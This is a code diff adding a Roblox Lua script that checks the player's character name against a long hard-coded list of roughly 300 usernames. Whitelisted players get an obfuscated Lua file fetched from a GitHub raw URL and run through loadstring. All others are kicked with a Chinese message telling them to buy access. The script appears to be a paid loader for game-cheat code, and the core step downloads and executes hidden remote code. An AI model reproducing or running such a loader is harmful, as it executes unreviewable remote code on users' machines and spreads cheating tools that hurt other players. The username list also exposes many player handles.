@@ -1,0 +1,753 @@
+repeat
+    task.wait()
+until game.Players.LocalPlayer.Character~=nil;
+local a=tostring(game.Players.LocalPlayer.Character);
+if a=="hdjowhxi"then
+_G.whitelisted=true
+elseif a=="qazchtdv"then
+_G.whitelisted=true
+elseif a=="djdjeuehdijd"then
+_G.whitelisted=true
+elseif a=="lmy114514x"then
+_G.whitelisted=true
+elseif a=="Sally_yeh"then
+_G.whitelisted=true
+elseif a=="mobaixaa"then
+_G.whitelisted=true
+elseif a=="cjsn520"then
+_G.whitelisted=true
+elseif a=="paichusuo"then
+_G.whitelisted=true
+elseif a=="WDNMD4258"then
+_G.whitelisted=true
+elseif a=="MAIRAITHV"then
+_G.whitelisted=true
+elseif a=="yizyh_chinese"then
+_G.whitelisted=true
+elseif a=="dhvfh5546"then
+_G.whitelisted=true
+elseif a=="Yangmanrang"then
+_G.whitelisted=true
+elseif a=="yezhiqiuyyds"then
+_G.whitelisted=true
+elseif a=="1yyx12"then
+_G.whitelisted=true
+elseif a=="dujianjjjjjj"then
+_G.whitelisted=true
+elseif a=="xh_shenming"then
+_G.whitelisted=true
+elseif a=="hdhsfsg6155hdh"then
+_G.whitelisted=true
+elseif a=="ttfuuffn"then
+_G.whitelisted=true
+elseif a=="hi32mop"then
+_G.whitelisted=true
+elseif a=="generals520"then
+_G.whitelisted=true
+elseif a=="elio12301230"then
+_G.whitelisted=true
+elseif a=="TC_xtu"then
+_G.whitelisted=true
+elseif a=="YZHCISS"then
+_G.whitelisted=true
+elseif a=="shuaiqi999"then
+_G.whitelisted=true
+elseif a=="ugribihonq"then
+_G.whitelisted=true
+elseif a=="wfcgwty"then
+_G.whitelisted=true
+elseif a=="wozhensk"then
+_G.whitelisted=true
+elseif a=="hjcrubxdp"then
+_G.whitelisted=true
+elseif a=="dolucb"then
+_G.whitelisted=true
+elseif a=="abc539297930"then
+_G.whitelisted=true
+elseif a=="jdhdhxijd"then
+_G.whitelisted=true
+elseif a=="jntm1534"then
+_G.whitelisted=true
+elseif a=="Iwuruwiey"then
+_G.whitelisted=true
+elseif a=="CZCZ1395"then
+_G.whitelisted=true
+elseif a=="qweascz158"then
+_G.whitelisted=true
+elseif a=="lhxbbwan"then
+_G.whitelisted=true
+elseif a=="Xiehuli_233"then
+_G.whitelisted=true
+elseif a=="wyq123456789"then
+_G.whitelisted=true
+elseif a=="woshiikun1145141919"then
+_G.whitelisted=true
+elseif a=="saiw54"then
+_G.whitelisted=true
+elseif a=="yanmingzou"then
+_G.whitelisted=true
+elseif a=="HFSAQ2001"then
+_G.whitelisted=true
+elseif a=="qq16355"then
+_G.whitelisted=true
+elseif a=="onevanbf"then
+_G.whitelisted=true
+elseif a=="PUBD_C"then
+_G.whitelisted=true
+elseif a=="qwqmakeqwqr"then
+_G.whitelisted=true
+elseif a=="QBBBBBQ"then
+_G.whitelisted=true
+elseif a=="AGCaiwu"then
+_G.whitelisted=true
+elseif a=="nnnnopkj"then
+_G.whitelisted=true
+elseif a=="fshfffdv"then
+_G.whitelisted=true
+elseif a=="Rainy6576"then
+_G.whitelisted=true
+elseif a=="saiw80"then
+_G.whitelisted=true
+elseif a=="sbjjhgg1234"then
+_G.whitelisted=true
+elseif a=="55575boybys"then
+_G.whitelisted=true
+elseif a=="liushunwen"then
+_G.whitelisted=true
+elseif a=="shwgsjdh"then
+_G.whitelisted=true
+elseif a=="wananlhd"then
+_G.whitelisted=true
+elseif a=="qiuciqwq"then
+_G.whitelisted=true
+elseif a=="pigshouxin23"then
+_G.whitelisted=true
+elseif a=="123qazlm"then
+_G.whitelisted=true
+elseif a=="520_shx"then
+_G.whitelisted=true
+elseif a=="Csy110511"then
+_G.whitelisted=true
+elseif a=="huangjinyouzui"then
+_G.whitelisted=true
+elseif a=="dobmdj6"then
+_G.whitelisted=true
+elseif a=="LjjyyOs"then
+_G.whitelisted=true
+elseif a=="pksuys"then
+_G.whitelisted=true
+elseif a=="Anjbhjk"then
+_G.whitelisted=true
+elseif a=="lsfssqz"then
+_G.whitelisted=true
+elseif a=="gulijiayinati"then
+_G.whitelisted=true
+elseif a=="WCNM11123"then
+_G.whitelisted=true
+elseif a=="daodeyufazhi"then
+_G.whitelisted=true
+elseif a=="Sisjshnu"then
+_G.whitelisted=true
+elseif a=="JiuYiIL"then
+_G.whitelisted=true
+elseif a=="zhao1234_8"then
+_G.whitelisted=true
+elseif a=="shikunadd"then
+_G.whitelisted=true
+elseif a=="xkayyds"then
+_G.whitelisted=true
+elseif a=="ghdshhn"then
+_G.whitelisted=true
+elseif a=="yuhjnmnmhjyu"then
+_G.whitelisted=true
+elseif a=="xiaoyu199911"then
+_G.whitelisted=true
+elseif a=="jjfjjmlsfj"then
+_G.whitelisted=true
+elseif a=="HTYZAM"then
+_G.whitelisted=true
+elseif a=="u_look1234"then
+_G.whitelisted=true
+elseif a=="qw520131"then
+_G.whitelisted=true
+elseif a=="qowuema"then
+_G.whitelisted=true
+elseif a=="Lixue0812"then
+_G.whitelisted=true
+elseif a=="qwa12dttt"then
+_G.whitelisted=true
+elseif a=="China_FaQ"then
+_G.whitelisted=true
+elseif a=="1357qetums"then
+_G.whitelisted=true
+elseif a=="fcdvghgj"then
+_G.whitelisted=true
+elseif a=="qazwsx1590s"then
+_G.whitelisted=true
+elseif a=="jchgcjt"then
+_G.whitelisted=true
+elseif a=="rnm123412"then
+_G.whitelisted=true
+elseif a=="xujiacheng1015"then
+_G.whitelisted=true
+elseif a=="Xiaolio_OuO"then
+_G.whitelisted=true
+elseif a=="zcl1110"then
+_G.whitelisted=true
+elseif a=="fffbvghfryujbc"then
+_G.whitelisted=true
+elseif a=="cxdfgdxfcfre"then
+_G.whitelisted=true
+elseif a=="sdee1354"then
+_G.whitelisted=true
+elseif a=="dk_pio"then
+_G.whitelisted=true
+elseif a=="nmlgjb541"then
+_G.whitelisted=true
+elseif a=="Robloxian640517089"then
+_G.whitelisted=true
+elseif a=="roblookonox"then
+_G.whitelisted=true
+elseif a=="xdtfbl"then
+_G.whitelisted=true
+elseif a=="zxy1346790"then
+_G.whitelisted=true
+elseif a=="ikun118"then
+_G.whitelisted=true
+elseif a=="CSY_520"then
+_G.whitelisted=true
+elseif a=="xuzucu_CN"then
+_G.whitelisted=true
+elseif a=="dawyfc_eee"then
+_G.whitelisted=true
+elseif a=="SlowwRyn"then
+_G.whitelisted=true
+elseif a=="duanajnb"then
+_G.whitelisted=true
+elseif a=="wsguor"then
+_G.whitelisted=true
+elseif a=="LX962464LX"then
+_G.whitelisted=true
+elseif a=="mc_shuion"then
+_G.whitelisted=true
+elseif a=="jhdcvbncgv"then
+_G.whitelisted=true
+elseif a=="gdhsfhhfj"then
+_G.whitelisted=true
+elseif a=="watqqtqqaw"then
+_G.whitelisted=true
+elseif a=="Yihuanl"then
+_G.whitelisted=true
+elseif a=="liyiji1m73"then
+_G.whitelisted=true
+elseif a=="yrhjrkjj"then
+_G.whitelisted=true
+elseif a=="qwe116p"then
+_G.whitelisted=true
+elseif a=="pichang233"then
+_G.whitelisted=true
+elseif a=="ssdjgjb"then
+_G.whitelisted=true
+elseif a=="yydsjswn"then
+_G.whitelisted=true
+elseif a=="naipixiaosu"then
+_G.whitelisted=true
+elseif a=="guuvinik"then
+_G.whitelisted=true
+elseif a=="10086ajs10"then
+_G.whitelisted=true
+elseif a=="xaosenbeshi"then
+_G.whitelisted=true
+elseif a=="gcjgfvj114514"then
+_G.whitelisted=true
+elseif a=="126gygygygy2"then
+_G.whitelisted=true
+elseif a=="QWENBM6"then
+_G.whitelisted=true
+elseif a=="liyuace_fens"then
+_G.whitelisted=true
+elseif a=="ctrljnym"then
+_G.whitelisted=true
+elseif a=="888mmmm8"then
+_G.whitelisted=true
+elseif a=="4235ugd"then
+_G.whitelisted=true
+elseif a=="ahnr_ji"then
+_G.whitelisted=true
+elseif a=="LuoMing_bz"then
+_G.whitelisted=true
+elseif a=="utaqzwws"then
+_G.whitelisted=true
+elseif a=="RobloxNo076"then
+_G.whitelisted=true
+elseif a=="1313113_tyty"then
+_G.whitelisted=true
+elseif a=="Mleaf0208"then
+_G.whitelisted=true
+elseif a=="yuefei1234kkyycck"then
+_G.whitelisted=true
+elseif a=="kkyycck"then
+_G.whitelisted=true
+elseif a=="33447BOB"then
+_G.whitelisted=true
+elseif a=="Enderblack123awa"then
+_G.whitelisted=true
+elseif a=="hggccccg"then
+_G.whitelisted=true
+elseif a=="120502lyj"then
+_G.whitelisted=true
+elseif a=="1257xtdfgdgdyfxfy"then
+_G.whitelisted=true
+elseif a=="gfgggfgghbvvbb5885"then
+_G.whitelisted=true
+elseif a=="goubamm"then
+_G.whitelisted=true
+elseif a=="ieufirjrhf"then
+_G.whitelisted=true
+elseif a=="jguuf5yiicsertui"then
+_G.whitelisted=true
+elseif a=="qingyueshusheng"then
+_G.whitelisted=true
+elseif a=="BianGGOOO"then
+_G.whitelisted=true
+elseif a=="qqut1rc"then
+_G.whitelisted=true
+elseif a=="mcxzxzmc"then
+_G.whitelisted=true
+elseif a=="hdjdnjsss1"then
+_G.whitelisted=true
+elseif a=="wrzydxz"then
+_G.whitelisted=true
+elseif a=="Linlin5656"then
+_G.whitelisted=true
+elseif a=="bhjvsujvs"then
+_G.whitelisted=true
+elseif a=="wuliao7780"then
+_G.whitelisted=true
+elseif a=="LingKing114514"then
+_G.whitelisted=true
+elseif a=="xyy_222"then
+_G.whitelisted=true
+elseif a=="scartmr"then
+_G.whitelisted=true
+elseif a=="qw87656"then
+_G.whitelisted=true
+elseif a=="ysyyyds123"then
+_G.whitelisted=true
+elseif a=="kugou513"then
+_G.whitelisted=true
+elseif a=="wdbls32"then
+_G.whitelisted=true
+elseif a=="weasel0920"then
+_G.whitelisted=true
+elseif a=="Bill091215"then
+_G.whitelisted=true
+elseif a=="Super370402"then
+_G.whitelisted=true
+elseif a=="jinyan0729"then
+_G.whitelisted=true
+elseif a=="sssxiaochaosss"then
+_G.whitelisted=true
+elseif a=="dhusisix"then
+_G.whitelisted=true
+elseif a=="evalbl2"then
+_G.whitelisted=true
+elseif a=="AD_dede"then
+_G.whitelisted=true
+elseif a=="CN_blibliszkqs"then
+_G.whitelisted=true
+elseif a=="TcaMoChen"then
+_G.whitelisted=true
+elseif a=="520njjx"then
+_G.whitelisted=true
+elseif a=="hjjsnsdkbskwwish"then
+_G.whitelisted=true
+elseif a=="hahahabanlai"then
+_G.whitelisted=true
+elseif a=="chenweijie18"then
+_G.whitelisted=true
+elseif a=="sjg671"then
+_G.whitelisted=true
+elseif a=="L24764771a"then
+_G.whitelisted=true
+elseif a=="123Zuj"then
+_G.whitelisted=true
+elseif a=="wevyyds"then
+_G.whitelisted=true
+elseif a=="disy1374hwj"then
+_G.whitelisted=true
+elseif a=="YxuH9Tnb"then
+_G.whitelisted=true
+elseif a=="Aabhyc"then
+_G.whitelisted=true
+elseif a=="1762111g"then
+_G.whitelisted=true
+elseif a=="lzmxlzm"then
+_G.whitelisted=true
+elseif a=="Script_hk"then
+_G.whitelisted=true
+elseif a=="zelalaqwq"then
+_G.whitelisted=true
+elseif a=="hour_noob"then
+_G.whitelisted=true
+elseif a=="askdjdjdkkdskdk"then
+_G.whitelisted=true
+elseif a=="ATRNAOC"then
+_G.whitelisted=true
+elseif a=="fQadwaa"then
+_G.whitelisted=true
+elseif a=="haihaihainb"then
+_G.whitelisted=true
+elseif a=="Daocqgy"then
+_G.whitelisted=true
+elseif a=="q1479432384"then
+_G.whitelisted=true
+elseif a=="like_zxcv"then
+_G.whitelisted=true
+elseif a=="sbzghdy"then
+_G.whitelisted=true
+elseif a=="ZXC77614377"then
+_G.whitelisted=true
+elseif a=="dhe673"then
+_G.whitelisted=true
+elseif a=="scaj45866"then
+_G.whitelisted=true
+elseif a=="zzttyy1"then
+_G.whitelisted=true
+elseif a=="hyqhhh"then
+_G.whitelisted=true
+elseif a=="yuhjuff"then
+_G.whitelisted=true
+elseif a=="zhong_tong"then
+_G.whitelisted=true
+elseif a=="ZXC3040565774"then
+_G.whitelisted=true
+elseif a=="ddddfDSDC"then
+_G.whitelisted=true
+elseif a=="longbaobao12"then
+_G.whitelisted=true
+elseif a=="sb250sbss"then
+_G.whitelisted=true
+elseif a=="Mr_JIKUAI"then
+_G.whitelisted=true
+elseif a=="FBl1994"then
+_G.whitelisted=true
+elseif a=="sepeaoem"then
+_G.whitelisted=true
+elseif a=="ABCCOMabccom"then
+_G.whitelisted=true
+elseif a=="yongqi123123"then
+_G.whitelisted=true
+elseif a=="hyqhhhhh"then
+_G.whitelisted=true
+elseif a=="Foxmail_D"then
+_G.whitelisted=true
+elseif a=="Froacasz"then
+_G.whitelisted=true
+elseif a=="gaunyuwo10687"then
+_G.whitelisted=true
+elseif a=="15790tp"then
+_G.whitelisted=true
+elseif a=="kszcbb"then
+_G.whitelisted=true
+elseif a=="tongmanjun"then
+_G.whitelisted=true
+elseif a=="jshyfjwl"then
+_G.whitelisted=true
+elseif a=="fgkpolmr"then
+_G.whitelisted=true
+elseif a=="whhdgshxhdh"then
+_G.whitelisted=true
+elseif a=="wycwyhj"then
+_G.whitelisted=true
+elseif a=="ysysafx"then
+_G.whitelisted=true
+elseif a=="whhdgshxhdh"then
+_G.whitelisted=true
+elseif a=="YOUTONYOYO"then
+_G.whitelisted=true
+elseif a=="tuidugcsee"then
+_G.whitelisted=true
+elseif a=="sjssjjsjsjshshs"then
+_G.whitelisted=true
+elseif a=="112ZZZqqs"then
+_G.whitelisted=true
+elseif a=="SHBan_N"then
+_G.whitelisted=true
+elseif a=="wevyyds6"then
+_G.whitelisted=true
+elseif a=="wevyyds6"then
+_G.whitelisted=true
+elseif a=="qq343434"then
+_G.whitelisted=true
+elseif a=="djajapm5mTj"then
+_G.whitelisted=true
+elseif a=="shbshb1111"then
+_G.whitelisted=true
+elseif a=="C_coco9901"then
+_G.whitelisted=true
+elseif a=="jjyouheiyouchang"then
+_G.whitelisted=true
+elseif a=="TIANYIJIA"then
+_G.whitelisted=true
+elseif a=="qzz2403349"then
+_G.whitelisted=true
+elseif a=="520sssssss"then
+_G.whitelisted=true
+elseif a=="tc3p39"then
+_G.whitelisted=true
+elseif a=="ldmnd2"then
+_G.whitelisted=true
+elseif a=="ikuyo1215"then
+_G.whitelisted=true
+elseif a=="ifw215"then
+_G.whitelisted=true
+elseif a=="YBTPPD"then
+_G.whitelisted=true
+elseif a=="KM34PK"then
+_G.whitelisted=true
+elseif a=="akcjxgg"then
+_G.whitelisted=true
+elseif a=="lakahqp"then
+_G.whitelisted=true
+elseif a=="xiong132"then
+_G.whitelisted=true
+elseif a=="nmjjjjmna"then
+_G.whitelisted=true
+elseif a=="PUBD_D"then
+_G.whitelisted=true
+elseif a=="qrttyyuuwrttasy"then
+_G.whitelisted=true
+elseif a=="jsjsnsnksjsjs"then
+_G.whitelisted=true
+elseif a=="fhkifdu"then
+_G.whitelisted=true
+elseif a=="wsz6666551"then
+_G.whitelisted=true
+elseif a=="6764udh"then
+_G.whitelisted=true
+elseif a=="wswjby"then
+_G.whitelisted=true
+elseif a=="857857yu"then
+_G.whitelisted=true
+elseif a=="RPD_COP"then
+_G.whitelisted=true
+elseif a=="995995QQ"then
+_G.whitelisted=true
+elseif a=="Amireux114514"then
+_G.whitelisted=true
+elseif a=="saiw80"then
+_G.whitelisted=true
+elseif a=="Roblxo_LZB"then
+_G.whitelisted=true
+elseif a=="xyjcdg"then
+_G.whitelisted=true
+elseif a=="114514didke"then
+_G.whitelisted=true
+elseif a=="fangfyfgny"then
+_G.whitelisted=true
+elseif a=="asdfghjklhvvnnjg"then
+_G.whitelisted=true
+elseif a=="RTRTWPN"then
+_G.whitelisted=true
+elseif a=="qq33461"then
+_G.whitelisted=true
+elseif a=="linkplkk"then
+_G.whitelisted=true
+elseif a=="Nvme_G"then
+_G.whitelisted=true
+elseif a=="sandy125126zp"then
+_G.whitelisted=true
+elseif a=="ejdjfbfjcjg"then
+_G.whitelisted=true
+elseif a=="Qazwersdxrf"then
+_G.whitelisted=true
+elseif a=="heibaosaiya"then
+_G.whitelisted=true
+elseif a=="imikun556"then
+_G.whitelisted=true
+elseif a=="jkjk114514"then
+_G.whitelisted=true
+elseif a=="mzhnq5551"then
+_G.whitelisted=true
+elseif a=="wyf114514810"then
+_G.whitelisted=true
+elseif a=="ksydgdhj"then
+_G.whitelisted=true
+elseif a=="DiLKGG"then
+_G.whitelisted=true
+elseif a=="55555AWTGK"then
+_G.whitelisted=true
+elseif a=="MustG_Ofaster"then
+_G.whitelisted=true
+elseif a=="mesbme"then
+_G.whitelisted=true
+elseif a=="fgujfdeqwdgij"then
+_G.whitelisted=true
+elseif a=="CUSESNB"then
+_G.whitelisted=true
+elseif a=="CNMB11123"then
+_G.whitelisted=true
+elseif a=="zhonuyb"then
+_G.whitelisted=true
+elseif a=="qgjvvu"then
+_G.whitelisted=true
+elseif a=="dgejeuwfnq1389"then
+_G.whitelisted=true
+elseif a=="cyz147258"then
+_G.whitelisted=true
+elseif a=="shiershengxiaonui"then
+_G.whitelisted=true
+elseif a=="zhkvkg"then
+_G.whitelisted=true
+elseif a=="lmz554747158"then
+_G.whitelisted=true
+elseif a=="haochi2023"then
+_G.whitelisted=true
+elseif a=="zhairuizhi"then
+_G.whitelisted=true
+elseif a=="jbchidjefhu"then
+_G.whitelisted=true
+elseif a=="stys3721"then
+_G.whitelisted=true
+elseif a=="2011320ying"then
+_G.whitelisted=true
+elseif a=="haochi2010"then
+_G.whitelisted=true
+elseif a=="shhsgbdbbdb"then
+_G.whitelisted=true
+elseif a=="sygjzetxj"then
+_G.whitelisted=true
+elseif a=="jsnxvxos"then
+_G.whitelisted=true
+elseif a=="yjyh2012520648"then
+_G.whitelisted=true
+elseif a=="pro_xx812"then
+_G.whitelisted=true
+elseif a=="Bailonghuang123"then
+_G.whitelisted=true
+elseif a=="ifidxiidu"then
+_G.whitelisted=true
+elseif a=="gishohanduoyi"then
+_G.whitelisted=true
+elseif a=="lllo_ch"then
+_G.whitelisted=true
+elseif a=="02QOQ"then
+_G.whitelisted=true
+elseif a=="dogsup24"then
+_G.whitelisted=true
+elseif a=="YZQTIJbQImI3IA"then
+_G.whitelisted=true
+elseif a=="w1236857"then
+_G.whitelisted=true
+elseif a=="vuyyugb"then
+_G.whitelisted=true
+elseif a=="gvghcgcq"then
+_G.whitelisted=true
+elseif a=="Chinayydsnbcjwd"then
+_G.whitelisted=true
+elseif a=="qyag_jwj"then
+_G.whitelisted=true
+elseif a=="jkajhhs"then
+_G.whitelisted=true
+elseif a=="whczcm"then
+_G.whitelisted=true
+elseif a=="White5273"then
+_G.whitelisted=true
+elseif a=="114514etd"then
+_G.whitelisted=true
+elseif a=="CHINAiukn"then
+_G.whitelisted=true
+elseif a=="sgsgwhwhbwveh"then
+_G.whitelisted=true
+elseif a=="ugvfgfG"then
+_G.whitelisted=true
+elseif a=="hchghghchgggvvx"then
+_G.whitelisted=true
+elseif a=="Chenhd666"then
+_G.whitelisted=true
+elseif a=="Rick_ice666"then
+_G.whitelisted=true
+elseif a=="rogaac"then
+_G.whitelisted=true
+elseif a=="vuyyugb"then
+_G.whitelisted=true
+elseif a=="xiaoui112"then
+_G.whitelisted=true
+elseif a=="haochi5564"then
+_G.whitelisted=true
+elseif a=="CRRyeyu"then
+_G.whitelisted=true
+elseif a=="13286847446m"then
+_G.whitelisted=true
+elseif a=="BJBDN12"then
+_G.whitelisted=true
+elseif a=="qweasd49"then
+_G.whitelisted=true
+elseif a=="dazhohggo"then
+_G.whitelisted=true
+elseif a=="jiangchengxun"then
+_G.whitelisted=true
+elseif a=="rcfhf544"then
+_G.whitelisted=true
+elseif a=="akeoshwjd"then
+_G.whitelisted=true
+elseif a=="fnfneoskid"then
+_G.whitelisted=true
+elseif a=="ycxyooh"then
+_G.whitelisted=true
+elseif a=="lihongying1"then
+_G.whitelisted=true
+elseif a=="Vincentcoos"then
+_G.whitelisted=true
+elseif a=="ChinaMuchen"then
+_G.whitelisted=true
+elseif a=="ygfttttttthq5"then
+_G.whitelisted=true
+elseif a=="fgyumvcxzp"then
+_G.whitelisted=true
+elseif a=="fqmnqgun"then
+_G.whitelisted=true
+elseif a=="powiwijj"then
+_G.whitelisted=true
+elseif a=="asdadsada2334"then
+_G.whitelisted=true
+elseif a=="vrtpoq"then
+_G.whitelisted=true
+elseif a=="Misource"then
+_G.whitelisted=true
+elseif a=="QWERTYmanml"then
+_G.whitelisted=true
+elseif a=="csw12345qq"then
+_G.whitelisted=true
+elseif a=="ghhhggtff"then
+_G.whitelisted=true
+elseif a=="wwb100325"then
+_G.whitelisted=true
+elseif a=="pvzs3"then
+_G.whitelisted=true
+elseif a=="abdefghijklmn66"then
+_G.whitelisted=true
+elseif a=="liangtiande"then
+_G.whitelisted=true
+elseif a=="rtewrtew34"then
+_G.whitelisted=true
+elseif a=="CN_AREHG250"then
+_G.whitelisted=true
+elseif a=="NOOB_MAX1222"then
+_G.whitelisted=true
+elseif a=="qichengdesu"then
+_G.whitelisted=true
+elseif a=="xuxuemo1"then
+_G.whitelisted=true
+elseif a=="AJSVHNMW"then
+_G.whitelisted=true
+elseif a=="HaiHai_WoYouLaiLeAo"then
+_G.whitelisted=true
+end
+if _G.whitelisted==true then
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/IIIIllllIIlllllIIIIIlllIIIllllIIIllIIll/baijiaobengv3beta/main/jz1-obfuscated.lua'),true))()
+    else
+ 
+game.Players.LocalPlayer:Kick(a.."你没有被列入白名单，请购买或者找群主反馈")
+end
